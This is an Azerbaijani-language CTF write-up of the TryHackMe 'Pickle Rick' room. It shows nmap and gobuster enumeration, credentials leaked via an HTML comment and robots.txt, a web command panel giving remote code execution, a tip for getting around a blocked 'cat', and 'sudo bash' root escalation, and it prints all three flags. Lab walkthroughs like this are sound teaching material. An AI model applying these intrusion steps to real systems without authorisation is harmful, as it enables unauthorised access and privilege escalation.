# 🚩 TryHackMe – Pickle Rick CTF | Azərbaycanca Write-up

> **Room:** [Pickle Rick](https://tryhackme.com/room/picklerick)
> **Çətinlik:** Asan
> **Kateqoriya:** Web Enumeration, Command Injection, Linux Privilege Escalation
> **Mövzu:** Rick and Morty serialı mövzusunda hazırlanmışdır 🥒
> **Məqsəd:** Rick-i pickle olmaqdan xilas etmək üçün 3 ingredient (bayraq) tapılmalıdır

---

## 📖 Ümumi Baxış

Bu CTF-də əsas hücum səthi bir veb serveridir. Gizli məlumatlar səhifənin mənbə kodunda, robots.txt-də və server qovluqlarındadır. Daxil olduqdan sonra veb əsaslı command panel vasitəsilə sistem əmrləri icra etmək mümkündür.

### Hücum Zənciri:
```
Nmap skan
    ↓
Veb səhifənin mənbə kodu → istifadəçi adı: R1ckRul3s
    ↓
robots.txt → şifrə: Wubbalubbadubdub
    ↓
Gobuster → /login.php tapıldı
    ↓
Login → Command Panel
    ↓
Command Panel → ls, cat → 1-ci ingredient
    ↓
/home/rick/ → 2-ci ingredient
    ↓
sudo -l → sudo bash → /root/ → 3-cü ingredient 🏆
```

---

## 🔎 Mərhələ 1: Nmap ilə Port Skan

### Nmap nədir?
**Nmap** — şəbəkədə açıq portları və işləyən xidmətləri aşkar edən kəşfiyyat alətidir. Hər hücumun başlanğıc nöqtəsidir.

### Əmr:
```bash
nmap -sC -sV <HEDEF-IP>
```

**Parametrlərin mənası:**

| Parametr | Mənası |
|----------|--------|
| `-sC` | Default skriptləri işlət (xidmət versiyasını, zəiflikləri yoxla) |
| `-sV` | Xidmət versiyasını aşkar et |
| `<HEDEF-IP>` | Hədəfin IP ünvanı |

### Nəticə:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

**Nə öyrəndik?**

| Port | Xidmət | Qeyd |
|------|--------|------|
| 22 | SSH | Hələlik kredensial yoxdur |
| 80 | HTTP | Veb server — əsas hücum səthi |

---

## 🌐 Mərhələ 2: Veb Səhifənin Kəşfi

`http://<HEDEF-IP>` — Rick-in köməy istədiyi bir səhifə görünür.

### Addım 1 — Mənbə Kodunu Oxu (Page Source):

Brauzerdə `Ctrl+U` və ya sağ klik → "View Page Source" et.

**Nəticə — HTML şərhi içində gizli məlumat:**
```html
<!--
    Note to self, remember username!
    Username: R1ckRul3s
-->
```

🎯 **İstifadəçi adı tapıldı: `R1ckRul3s`**

**Niyə bunu yoxladıq?** Təcrübəsiz veb developerlar bəzən həssas məlumatları HTML şərhlərinin içinə yazırlar. Bu, çox geniş yayılmış bir səhvdir. Brauzerin render etdiyi səhifə bu şərhləri göstərmir, amma mənbə kodu hər şeyi açıq göstərir.

---

### Addım 2 — robots.txt Faylını Oxu:

`http://<HEDEF-IP>/robots.txt` ünvanına daxil ol.

**robots.txt nədir?** Bu fayl — axtarış motorlarına (Google, Bing) hansı səhifələri indeksləməməyi söyləyir. Lakin bu fayl **ictimai olaraq əlçatandır** — hər kəs oxuya bilər. CTF-lərdə çox vaxt gizli məlumat saxlayır.

**Nəticə:**
```
Wubbalubbadubdub
```

🎯 **Şifrə tapıldı: `Wubbalubbadubdub`**

---

## 🔍 Mərhələ 3: Gobuster ilə Gizli Səhifələri Tap

### Gobuster nədir?
**Gobuster** — veb serverdəki gizli qovluq və faylları brute force üsulu ilə tapar. Wordlist içindəki hər sözü URL-ə əlavə edib cavabı yoxlayır.

```bash
gobuster dir -u http://<HEDEF-IP> -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Parametrlərin mənası:**

| Parametr | Mənası |
|----------|--------|
| `dir` | Qovluq/fayl axtarışı rejimi |
| `-u` | Hədəf URL |
| `-w` | Wordlist faylı (sınaqdan keçiriləcək adların siyahısı) |
| `-t 50` | 50 paralel thread — sürəti artırır |

**Nəticə:**
```
/login.php       (Status: 200)
/assets          (Status: 301)
/portal.php      (Status: 302)
```

🎯 **Login səhifəsi tapıldı: `/login.php`**

---

## 🔐 Mərhələ 4: Login Paneli

`http://<HEDEF-IP>/login.php` — giriş formu görünür.

Topladığımız məlumatları işlət:

```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

✅ **Daxil olundu!** — Command Panel açılır.

---

## 💻 Mərhələ 5: Command Panel — Əmr İcra Et

Daxil olduqdan sonra bir input xanası görünür: **"Command Panel"**. Bu xanaya Linux əmrləri yaza və server üzərində icra edə bilirik.

**Bu niyə mümkündür?** Veb tətbiqi daxil olan mətni birbaşa sistem shell-inə ötürür — buna **Remote Code Execution (RCE)** deyilir. Bu, kritik bir zəiflikdir.

### Qovluğu siyahıla:
```bash
ls
```

**Nəticə:**
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

🎯 **`Sup3rS3cretPickl3Ingred.txt`** — bu birinci ingredientdir!

### Faylı oxu:
```bash
cat Sup3rS3cretPickl3Ingred.txt
```

**Nəticə:**
```
mr. meeseek hair
```

> ⚠️ **Qeyd:** Bəzən `cat` əmri bu paneldə bloklanır. Bu halda alternativlər:
> ```bash
> less Sup3rS3cretPickl3Ingred.txt
> more Sup3rS3cretPickl3Ingred.txt
> grep "" Sup3rS3cretPickl3Ingred.txt
> ```

### clue.txt-i də oxu:
```bash
cat clue.txt
```

**Nəticə:**
```
Look around the file system for the other ingredient.
```

İpucu verildi — fayl sistemini araşdır.

---

## 🥒 Mərhələ 6: İkinci Ingredient

### /home qovluğuna bax:
```bash
ls /home
```

**Nəticə:**
```
rick
ubuntu
```

`rick` adlı istifadəçinin ev qovluğu var.

```bash
ls /home/rick
```

**Nəticə:**
```
second ingredients
```

Boşluqlu fayl adı — dırnaq işarəsi ilə oxu:

```bash
cat "/home/rick/second ingredients"
```

**Nəticə:**
```
1 jerry tear
```

✅ **İkinci ingredient tapıldı: `1 jerry tear`**

---

## 🔑 Mərhələ 7: Privilege Escalation — Root-a Çıx

### sudo -l ilə icazələri yoxla:
```bash
sudo -l
```

**`sudo -l` nədir?** Bu əmr — cari istifadəçinin şifrəsiz və ya şifrə ilə root olaraq hansı əmrləri icra edə biləcəyini göstərir.

**Nəticə:**
```
Matching Defaults entries for www-data on ip-10-x-x-x:
    env_reset, mail_badpass, ...

User www-data may run the following commands on ip-10-x-x-x:
    (ALL) NOPASSWD: ALL
```

**`(ALL) NOPASSWD: ALL`** — bu nə deməkdir?

| Hissə | Mənası |
|-------|--------|
| `ALL` (birinci) | İstənilən istifadəçi olaraq icra et |
| `NOPASSWD` | Şifrə tələb etmə |
| `ALL` (ikinci) | İstənilən əmri icra et |

Yəni `www-data` istifadəçisi **şifrəsiz, istənilən əmri root olaraq** icra edə bilər. Bu — son dərəcə təhlükəli konfiqurasiya səhvidir.

### Root shell al:
```bash
sudo bash
```

Bu əmr root səlahiyyəti ilə yeni bash shell açır. İndi `whoami` əmri `root` qaytarır.

### Root qovluğunu araşdır:
```bash
ls /root
```

**Nəticə:**
```
3rd.txt
snap
```

```bash
cat /root/3rd.txt
```

**Nəticə:**
```
3rd ingredients: fleeb juice
```

✅ **Üçüncü ingredient tapıldı: `fleeb juice`** 🏆

---

## ✅ Xülasə Cədvəli

| Mərhələ | Alət/Metod | Tapıntı |
|---------|------------|---------|
| Port Skan | Nmap | 22 (SSH), 80 (HTTP) |
| Mənbə kodu | View Page Source | İstifadəçi adı: `R1ckRul3s` |
| robots.txt | Brauzer | Şifrə: `Wubbalubbadubdub` |
| Qovluq Tarama | Gobuster | `/login.php` tapıldı |
| Giriş | Login formu | Command Panel əldə edildi |
| RCE | Command Panel (`ls`, `cat`) | 1-ci ingredient: `mr. meeseek hair` |
| Fayl Sistemi | Command Panel | 2-ci ingredient: `1 jerry tear` |
| Sudo İcazəsi | `sudo -l` → `sudo bash` | Root shell alındı |
| Root Qovluğu | `cat /root/3rd.txt` | 3-cü ingredient: `fleeb juice` |

---

## 🎓 Öyrənilən Dərslər

1. **HTML mənbə kodunu həmişə yoxla** — şərhlər içində gizli məlumatlar ola bilər
2. **robots.txt oxu** — axtarış motorlarından gizlədilən yollar çox vaxt həssas məlumat saxlayır
3. **Gobuster/DirBuster işlət** — gizli login panelləri, admin səhifələri tapılır
4. **Command Panel = RCE** — veb tətbiqlərdə istifadəçi girişini shell-ə ötürmək kritik zəiflikdir
5. **`sudo -l` həmişə yoxla** — `NOPASSWD: ALL` birbaşa root deməkdir
6. **Boşluqlu fayl adlarında dırnaq işarəsi** — `cat "file name"` sintaksisini bil
7. **`cat` bloklananda alternativlər** — `less`, `more`, `grep ""` eyni işi görür
8. **Zəncir düşüncəsi** — hər tapıntı növbəti addımı açır; mənbə kodu → şifrə → login → RCE → root

---

## 🔗 Faydalı Linklər

- [TryHackMe – Pickle Rick](https://tryhackme.com/room/picklerick)
- [GTFOBins – sudo](https://gtfobins.github.io/gtfobins/bash/#sudo)
- [Gobuster GitHub](https://github.com/OJ/gobuster)
- [OWASP – RCE](https://owasp.org/www-community/attacks/Command_Injection)

---

*Yazıldı: 2026 | Platforma: TryHackMe | Azərbaycanca*
